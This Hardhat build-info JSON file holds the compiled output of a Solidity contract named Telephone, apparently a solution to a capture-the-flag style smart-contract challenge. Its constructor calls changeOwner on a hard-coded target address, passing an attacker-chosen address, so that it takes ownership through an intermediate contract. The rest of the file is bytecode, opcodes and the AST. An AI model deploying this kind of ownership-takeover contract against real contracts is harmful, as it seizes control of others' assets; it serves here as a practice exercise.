{
  "id": "df585d306a1aa22b287f00500bd412bf",
  "_format": "hh-sol-build-info-1",
  "solcVersion": "0.8.9",
  "solcLongVersion": "0.8.9+commit.e5eed63a",
  "input": {
    "language": "Solidity",
    "sources": {
      "contracts/Telephone.sol": {
        "content": "pragma solidity^0.8.9;\n\ninterface ITelephone {\n  function changeOwner (address _address) external; \n}\n\ncontract Telephone {\n  address targetAddress = 0xfde2538936b727fcE87b5e1ED8d6c9b440669eE3;\n  address exitAddress = 0xB702DC679dCe8d27c77AC49A63B9A138B674929E;\n\n  ITelephone targetContract;\n\n  constructor () {\n    targetContract = ITelephone(targetAddress); \n    targetContract.changeOwner(exitAddress);\n  }\n  /*\n  function interact() public {\n    return targetContract.changeOwner(exitAddress);   \n  }\n  */\n}\n"
      }
    },
    "settings": {
      "optimizer": {
        "enabled": false,
        "runs": 200
      },
      "outputSelection": {
        "*": {
          "*": [
            "abi",
            "evm.bytecode",
            "evm.deployedBytecode",
            "evm.methodIdentifiers",
            "metadata"
          ],
          "": [
            "ast"
          ]
        }
      }
    }
  },
  "output": {
    "contracts": {
      "contracts/Telephone.sol": {
        "ITelephone": {
          "abi": [
            {
              "inputs": [
                {
                  "internalType": "address",
                  "name": "_address",
                  "type": "address"
                }
              ],
              "name": "changeOwner",
              "outputs": [],
              "stateMutability": "nonpayable",
              "type": "function"
            }
          ],
          "evm": {
            "bytecode": {
              "functionDebugData": {},
              "generatedSources": [],
              "linkReferences": {},
              "object": "",
              "opcodes": "",
              "sourceMap": ""
            },
            "deployedBytecode": {
              "functionDebugData": {},
              "generatedSources": [],
              "immutableReferences": {},
              "linkReferences": {},
              "object": "",
              "opcodes": "",
              "sourceMap": ""
            },
            "methodIdentifiers": {
              "changeOwner(address)": "a6f9dae1"
            }
          },
          "metadata": "{\"compiler\":{\"version\":\"0.8.9+commit.e5eed63a\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"changeOwner\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/Telephone.sol\":\"ITelephone\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/Telephone.sol\":{\"keccak256\":\"0xf137c1183e95d068cc8f83d9d6358d218c96713b191f68a0ef303629b855d3f6\",\"urls\":[\"bzz-raw://7f9fd163479495da13ab8cfcd14c966ead5a9f7b7b144530a69b9d02a3a1d2f9\",\"dweb:/ipfs/QmaYyj9fACGECLLvbicsXfKVLTVxpaQiskYKrxVs2WmSYo\"]}},\"version\":1}"
        },
        "Telephone": {
          "abi": [
            {
              "inputs": [],
              "stateMutability": "nonpayable",
              "type": "constructor"
            }
          ],
          "evm": {
            "bytecode": {
              "functionDebugData": {
                "@_32": {
                  "entryPoint": null,
                  "id": 32,
                  "parameterSlots": 0,
                  "returnSlots": 0
                },
                "abi_encode_t_address_to_t_address_fromStack": {
                  "entryPoint": 513,
                  "id": null,
                  "parameterSlots": 2,
                  "returnSlots": 0
                },
                "abi_encode_tuple_t_address__to_t_address__fromStack_reversed": {
                  "entryPoint": 528,
                  "id": null,
                  "parameterSlots": 2,
                  "returnSlots": 1
                },
                "cleanup_t_address": {
                  "entryPoint": 495,
                  "id": null,
                  "parameterSlots": 1,
                  "returnSlots": 1
                },
                "cleanup_t_uint160": {
                  "entryPoint": 463,
                  "id": null,
                  "parameterSlots": 1,
                  "returnSlots": 1
                }
              },
              "generatedSources": [
                {
                  "ast": {
                    "nodeType": "YulBlock",
                    "src": "0:590:1",
                    "statements": [
                      {
                        "body": {
                          "nodeType": "YulBlock",
                          "src": "52:81:1",
                          "statements": [
                            {
                              "nodeType": "YulAssignment",
                              "src": "62:65:1",
                              "value": {
                                "arguments": [
                                  {
                                    "name": "value",
                                    "nodeType": "YulIdentifier",
                                    "src": "77:5:1"
                                  },
                                  {
                                    "kind": "number",
                                    "nodeType": "YulLiteral",
                                    "src": "84:42:1",
                                    "type": "",
                                    "value": "0xffffffffffffffffffffffffffffffffffffffff"
                                  }
                                ],
                                "functionName": {
                                  "name": "and",
                                  "nodeType": "YulIdentifier",
                                  "src": "73:3:1"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "73:54:1"
                              },
                              "variableNames": [
                                {
                                  "name": "cleaned",
                                  "nodeType": "YulIdentifier",
                                  "src": "62:7:1"
                                }
                              ]
                            }
                          ]
                        },
                        "name": "cleanup_t_uint160",
                        "nodeType": "YulFunctionDefinition",
                        "parameters": [
                          {
                            "name": "value",
                            "nodeType": "YulTypedName",
                            "src": "34:5:1",
                            "type": ""
                          }
                        ],
                        "returnVariables": [
                          {
                            "name": "cleaned",
                            "nodeType": "YulTypedName",
                            "src": "44:7:1",
                            "type": ""
                          }
                        ],
                        "src": "7:126:1"
                      },
                      {
                        "body": {
                          "nodeType": "YulBlock",
                          "src": "184:51:1",
                          "statements": [
                            {
                              "nodeType": "YulAssignment",
                              "src": "194:35:1",
                              "value": {
                                "arguments": [
                                  {
                                    "name": "value",
                                    "nodeType": "YulIdentifier",
                                    "src": "223:5:1"
                                  }
                                ],
                                "functionName": {
                                  "name": "cleanup_t_uint160",
                                  "nodeType": "YulIdentifier",
                                  "src": "205:17:1"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "205:24:1"
                              },
                              "variableNames": [
                                {
                                  "name": "cleaned",
                                  "nodeType": "YulIdentifier",
                                  "src": "194:7:1"
                                }
                              ]
                            }
                          ]
                        },
                        "name": "cleanup_t_address",
                        "nodeType": "YulFunctionDefinition",
                        "parameters": [
                          {
                            "name": "value",
                            "nodeType": "YulTypedName",
                            "src": "166:5:1",
                            "type": ""
                          }
                        ],
                        "returnVariables": [
                          {
                            "name": "cleaned",
                            "nodeType": "YulTypedName",
                            "src": "176:7:1",
                            "type": ""
                          }
                        ],
                        "src": "139:96:1"
                      },
                      {
                        "body": {
                          "nodeType": "YulBlock",
                          "src": "306:53:1",
                          "statements": [
                            {
                              "expression": {
                                "arguments": [
                                  {
                                    "name": "pos",
                                    "nodeType": "YulIdentifier",
                                    "src": "323:3:1"
                                  },
                                  {
                                    "arguments": [
                                      {
                                        "name": "value",
                                        "nodeType": "YulIdentifier",
                                        "src": "346:5:1"
                                      }
                                    ],
                                    "functionName": {
                                      "name": "cleanup_t_address",
                                      "nodeType": "YulIdentifier",
                                      "src": "328:17:1"
                                    },
                                    "nodeType": "YulFunctionCall",
                                    "src": "328:24:1"
                                  }
                                ],
                                "functionName": {
                                  "name": "mstore",
                                  "nodeType": "YulIdentifier",
                                  "src": "316:6:1"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "316:37:1"
                              },
                              "nodeType": "YulExpressionStatement",
                              "src": "316:37:1"
                            }
                          ]
                        },
                        "name": "abi_encode_t_address_to_t_address_fromStack",
                        "nodeType": "YulFunctionDefinition",
                        "parameters": [
                          {
                            "name": "value",
                            "nodeType": "YulTypedName",
                            "src": "294:5:1",
                            "type": ""
                          },
                          {
                            "name": "pos",
                            "nodeType": "YulTypedName",
                            "src": "301:3:1",
                            "type": ""
                          }
                        ],
                        "src": "241:118:1"
                      },
                      {
                        "body": {
                          "nodeType": "YulBlock",
                          "src": "463:124:1",
                          "statements": [
                            {
                              "nodeType": "YulAssignment",
                              "src": "473:26:1",
                              "value": {
                                "arguments": [
                                  {
                                    "name": "headStart",
                                    "nodeType": "YulIdentifier",
                                    "src": "485:9:1"
                                  },
                                  {
                                    "kind": "number",
                                    "nodeType": "YulLiteral",
                                    "src": "496:2:1",
                                    "type": "",
                                    "value": "32"
                                  }
                                ],
                                "functionName": {
                                  "name": "add",
                                  "nodeType": "YulIdentifier",
                                  "src": "481:3:1"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "481:18:1"
                              },
                              "variableNames": [
                                {
                                  "name": "tail",
                                  "nodeType": "YulIdentifier",
                                  "src": "473:4:1"
                                }
                              ]
                            },
                            {
                              "expression": {
                                "arguments": [
                                  {
                                    "name": "value0",
                                    "nodeType": "YulIdentifier",
                                    "src": "553:6:1"
                                  },
                                  {
                                    "arguments": [
                                      {
                                        "name": "headStart",
                                        "nodeType": "YulIdentifier",
                                        "src": "566:9:1"
                                      },
                                      {
                                        "kind": "number",
                                        "nodeType": "YulLiteral",
                                        "src": "577:1:1",
                                        "type": "",
                                        "value": "0"
                                      }
                                    ],
                                    "functionName": {
                                      "name": "add",
                                      "nodeType": "YulIdentifier",
                                      "src": "562:3:1"
                                    },
                                    "nodeType": "YulFunctionCall",
                                    "src": "562:17:1"
                                  }
                                ],
                                "functionName": {
                                  "name": "abi_encode_t_address_to_t_address_fromStack",
                                  "nodeType": "YulIdentifier",
                                  "src": "509:43:1"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "509:71:1"
                              },
                              "nodeType": "YulExpressionStatement",
                              "src": "509:71:1"
                            }
                          ]
                        },
                        "name": "abi_encode_tuple_t_address__to_t_address__fromStack_reversed",
                        "nodeType": "YulFunctionDefinition",
                        "parameters": [
                          {
                            "name": "headStart",
                            "nodeType": "YulTypedName",
                            "src": "435:9:1",
                            "type": ""
                          },
                          {
                            "name": "value0",
                            "nodeType": "YulTypedName",
                            "src": "447:6:1",
                            "type": ""
                          }
                        ],
                        "returnVariables": [
                          {
                            "name": "tail",
                            "nodeType": "YulTypedName",
                            "src": "458:4:1",
                            "type": ""
                          }
                        ],
                        "src": "365:222:1"
                      }
                    ]
                  },
                  "contents": "{\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function abi_encode_t_address_to_t_address_fromStack(value, pos) {\n        mstore(pos, cleanup_t_address(value))\n    }\n\n    function abi_encode_tuple_t_address__to_t_address__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_address_to_t_address_fromStack(value0,  add(headStart, 0))\n\n    }\n\n}\n",
                  "id": 1,
                  "language": "Yul",
                  "name": "#utility.yul"
                }
              ],
              "linkReferences": {},
              "object": "608060405273fde2538936b727fce87b5e1ed8d6c9b440669ee36000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555073b702dc679dce8d27c77ac49a63b9a138b674929e600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055503480156100b957600080fd5b5060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff16600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a6f9dae1600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff166040518263ffffffff1660e01b81526004016101989190610210565b600060405180830381600087803b1580156101b257600080fd5b505af11580156101c6573d6000803e3d6000fd5b5050505061022b565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006101fa826101cf565b9050919050565b61020a816101ef565b82525050565b60006020820190506102256000830184610201565b92915050565b603f806102396000396000f3fe6080604052600080fdfea2646970667358221220e117032e81d7cb2e923a8607df2cec1f071c74f398054fd8327d9a15b65eedfd64736f6c63430008090033",
              "opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH20 0xFDE2538936B727FCE87B5E1ED8D6C9B440669EE3 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH20 0xB702DC679DCE8D27C77AC49A63B9A138B674929E PUSH1 0x1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP CALLVALUE DUP1 ISZERO PUSH2 0xB9 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x2 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH1 0x2 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xA6F9DAE1 PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x198 SWAP2 SWAP1 PUSH2 0x210 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1B2 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x1C6 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH2 0x22B JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1FA DUP3 PUSH2 0x1CF JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x20A DUP2 PUSH2 0x1EF JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x225 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x201 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x3F DUP1 PUSH2 0x239 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xE1 OR SUB 0x2E DUP2 0xD7 0xCB 0x2E SWAP3 GASPRICE DUP7 SMOD 0xDF 0x2C 0xEC 0x1F SMOD SHR PUSH21 0xF398054FD8327D9A15B65EEDFD64736F6C63430008 MULMOD STOP CALLER ",
              "sourceMap": "103:408:0:-:0;;;150:42;126:66;;;;;;;;;;;;;;;;;;;;218:42;196:64;;;;;;;;;;;;;;;;;;;;295:114;;;;;;;;;;344:13;;;;;;;;;;316:14;;:42;;;;;;;;;;;;;;;;;;365:14;;;;;;;;;;;:26;;;392:11;;;;;;;;;;;365:39;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;103:408;;7:126:1;44:7;84:42;77:5;73:54;62:65;;7:126;;;:::o;139:96::-;176:7;205:24;223:5;205:24;:::i;:::-;194:35;;139:96;;;:::o;241:118::-;328:24;346:5;328:24;:::i;:::-;323:3;316:37;241:118;;:::o;365:222::-;458:4;496:2;485:9;481:18;473:26;;509:71;577:1;566:9;562:17;553:6;509:71;:::i;:::-;365:222;;;;:::o;103:408:0:-;;;;;;;"
            },
            "deployedBytecode": {
              "functionDebugData": {},
              "generatedSources": [],
              "immutableReferences": {},
              "linkReferences": {},
              "object": "6080604052600080fdfea2646970667358221220e117032e81d7cb2e923a8607df2cec1f071c74f398054fd8327d9a15b65eedfd64736f6c63430008090033",
              "opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xE1 OR SUB 0x2E DUP2 0xD7 0xCB 0x2E SWAP3 GASPRICE DUP7 SMOD 0xDF 0x2C 0xEC 0x1F SMOD SHR PUSH21 0xF398054FD8327D9A15B65EEDFD64736F6C63430008 MULMOD STOP CALLER ",
              "sourceMap": "103:408:0:-:0;;;;;"
            },
            "methodIdentifiers": {}
          },
          "metadata": "{\"compiler\":{\"version\":\"0.8.9+commit.e5eed63a\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/Telephone.sol\":\"Telephone\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/Telephone.sol\":{\"keccak256\":\"0xf137c1183e95d068cc8f83d9d6358d218c96713b191f68a0ef303629b855d3f6\",\"urls\":[\"bzz-raw://7f9fd163479495da13ab8cfcd14c966ead5a9f7b7b144530a69b9d02a3a1d2f9\",\"dweb:/ipfs/QmaYyj9fACGECLLvbicsXfKVLTVxpaQiskYKrxVs2WmSYo\"]}},\"version\":1}"
        }
      }
    },
    "errors": [
      {
        "component": "general",
        "errorCode": "1878",
        "formattedMessage": "Warning: SPDX license identifier not provided in source file. Before publishing, consider adding a comment containing \"SPDX-License-Identifier: <SPDX-License>\" to each source file. Use \"SPDX-License-Identifier: UNLICENSED\" for non-open-source code. Please see https://spdx.org for more information.\n--> contracts/Telephone.sol\n\n",
        "message": "SPDX license identifier not provided in source file. Before publishing, consider adding a comment containing \"SPDX-License-Identifier: <SPDX-License>\" to each source file. Use \"SPDX-License-Identifier: UNLICENSED\" for non-open-source code. Please see https://spdx.org for more information.",
        "severity": "warning",
        "sourceLocation": {
          "end": -1,
          "file": "contracts/Telephone.sol",
          "start": -1
        },
        "type": "Warning"
      }
    ],
    "sources": {
      "contracts/Telephone.sol": {
        "ast": {
          "absolutePath": "contracts/Telephone.sol",
          "exportedSymbols": {
            "ITelephone": [
              7
            ],
            "Telephone": [
              33
            ]
          },
          "id": 34,
          "nodeType": "SourceUnit",
          "nodes": [
            {
              "id": 1,
              "literals": [
                "solidity",
                "^",
                "0.8",
                ".9"
              ],
              "nodeType": "PragmaDirective",
              "src": "0:22:0"
            },
            {
              "abstract": false,
              "baseContracts": [],
              "canonicalName": "ITelephone",
              "contractDependencies": [],
              "contractKind": "interface",
              "fullyImplemented": false,
              "id": 7,
              "linearizedBaseContracts": [
                7
              ],
              "name": "ITelephone",
              "nameLocation": "34:10:0",
              "nodeType": "ContractDefinition",
              "nodes": [
                {
                  "functionSelector": "a6f9dae1",
                  "id": 6,
                  "implemented": false,
                  "kind": "function",
                  "modifiers": [],
                  "name": "changeOwner",
                  "nameLocation": "58:11:0",
                  "nodeType": "FunctionDefinition",
                  "parameters": {
                    "id": 4,
                    "nodeType": "ParameterList",
                    "parameters": [
                      {
                        "constant": false,
                        "id": 3,
                        "mutability": "mutable",
                        "name": "_address",
                        "nameLocation": "79:8:0",
                        "nodeType": "VariableDeclaration",
                        "scope": 6,
                        "src": "71:16:0",
                        "stateVariable": false,
                        "storageLocation": "default",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        "typeName": {
                          "id": 2,
                          "name": "address",
                          "nodeType": "ElementaryTypeName",
                          "src": "71:7:0",
                          "stateMutability": "nonpayable",
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        },
                        "visibility": "internal"
                      }
                    ],
                    "src": "70:18:0"
                  },
                  "returnParameters": {
                    "id": 5,
                    "nodeType": "ParameterList",
                    "parameters": [],
                    "src": "97:0:0"
                  },
                  "scope": 7,
                  "src": "49:49:0",
                  "stateMutability": "nonpayable",
                  "virtual": false,
                  "visibility": "external"
                }
              ],
              "scope": 34,
              "src": "24:77:0",
              "usedErrors": []
            },
            {
              "abstract": false,
              "baseContracts": [],
              "canonicalName": "Telephone",
              "contractDependencies": [],
              "contractKind": "contract",
              "fullyImplemented": true,
              "id": 33,
              "linearizedBaseContracts": [
                33
              ],
              "name": "Telephone",
              "nameLocation": "112:9:0",
              "nodeType": "ContractDefinition",
              "nodes": [
                {
                  "constant": false,
                  "id": 10,
                  "mutability": "mutable",
                  "name": "targetAddress",
                  "nameLocation": "134:13:0",
                  "nodeType": "VariableDeclaration",
                  "scope": 33,
                  "src": "126:66:0",
                  "stateVariable": true,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 8,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "126:7:0",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "value": {
                    "hexValue": "307866646532353338393336623732376663453837623565314544386436633962343430363639654533",
                    "id": 9,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": true,
                    "kind": "number",
                    "lValueRequested": false,
                    "nodeType": "Literal",
                    "src": "150:42:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    },
                    "value": "0xfde2538936b727fcE87b5e1ED8d6c9b440669eE3"
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 13,
                  "mutability": "mutable",
                  "name": "exitAddress",
                  "nameLocation": "204:11:0",
                  "nodeType": "VariableDeclaration",
                  "scope": 33,
                  "src": "196:64:0",
                  "stateVariable": true,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 11,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "196:7:0",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "value": {
                    "hexValue": "307842373032444336373964436538643237633737414334394136334239413133384236373439323945",
                    "id": 12,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": true,
                    "kind": "number",
                    "lValueRequested": false,
                    "nodeType": "Literal",
                    "src": "218:42:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    },
                    "value": "0xB702DC679dCe8d27c77AC49A63B9A138B674929E"
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 16,
                  "mutability": "mutable",
                  "name": "targetContract",
                  "nameLocation": "276:14:0",
                  "nodeType": "VariableDeclaration",
                  "scope": 33,
                  "src": "265:25:0",
                  "stateVariable": true,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_contract$_ITelephone_$7",
                    "typeString": "contract ITelephone"
                  },
                  "typeName": {
                    "id": 15,
                    "nodeType": "UserDefinedTypeName",
                    "pathNode": {
                      "id": 14,
                      "name": "ITelephone",
                      "nodeType": "IdentifierPath",
                      "referencedDeclaration": 7,
                      "src": "265:10:0"
                    },
                    "referencedDeclaration": 7,
                    "src": "265:10:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_contract$_ITelephone_$7",
                      "typeString": "contract ITelephone"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "body": {
                    "id": 31,
                    "nodeType": "Block",
                    "src": "310:99:0",
                    "statements": [
                      {
                        "expression": {
                          "id": 23,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "leftHandSide": {
                            "id": 19,
                            "name": "targetContract",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 16,
                            "src": "316:14:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_ITelephone_$7",
                              "typeString": "contract ITelephone"
                            }
                          },
                          "nodeType": "Assignment",
                          "operator": "=",
                          "rightHandSide": {
                            "arguments": [
                              {
                                "id": 21,
                                "name": "targetAddress",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": 10,
                                "src": "344:13:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_address",
                                  "typeString": "address"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_address",
                                  "typeString": "address"
                                }
                              ],
                              "id": 20,
                              "name": "ITelephone",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 7,
                              "src": "333:10:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_contract$_ITelephone_$7_$",
                                "typeString": "type(contract ITelephone)"
                              }
                            },
                            "id": 22,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "333:25:0",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_ITelephone_$7",
                              "typeString": "contract ITelephone"
                            }
                          },
                          "src": "316:42:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_contract$_ITelephone_$7",
                            "typeString": "contract ITelephone"
                          }
                        },
                        "id": 24,
                        "nodeType": "ExpressionStatement",
                        "src": "316:42:0"
                      },
                      {
                        "expression": {
                          "arguments": [
                            {
                              "id": 28,
                              "name": "exitAddress",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 13,
                              "src": "392:11:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            ],
                            "expression": {
                              "id": 25,
                              "name": "targetContract",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 16,
                              "src": "365:14:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_contract$_ITelephone_$7",
                                "typeString": "contract ITelephone"
                              }
                            },
                            "id": 27,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "lValueRequested": false,
                            "memberName": "changeOwner",
                            "nodeType": "MemberAccess",
                            "referencedDeclaration": 6,
                            "src": "365:26:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_function_external_nonpayable$_t_address_$returns$__$",
                              "typeString": "function (address) external"
                            }
                          },
                          "id": 29,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "functionCall",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "365:39:0",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_tuple$__$",
                            "typeString": "tuple()"
                          }
                        },
                        "id": 30,
                        "nodeType": "ExpressionStatement",
                        "src": "365:39:0"
                      }
                    ]
                  },
                  "id": 32,
                  "implemented": true,
                  "kind": "constructor",
                  "modifiers": [],
                  "name": "",
                  "nameLocation": "-1:-1:-1",
                  "nodeType": "FunctionDefinition",
                  "parameters": {
                    "id": 17,
                    "nodeType": "ParameterList",
                    "parameters": [],
                    "src": "307:2:0"
                  },
                  "returnParameters": {
                    "id": 18,
                    "nodeType": "ParameterList",
                    "parameters": [],
                    "src": "310:0:0"
                  },
                  "scope": 33,
                  "src": "295:114:0",
                  "stateMutability": "nonpayable",
                  "virtual": false,
                  "visibility": "public"
                }
              ],
              "scope": 34,
              "src": "103:408:0",
              "usedErrors": []
            }
          ],
          "src": "0:512:0"
        },
        "id": 0
      }
    }
  }
}
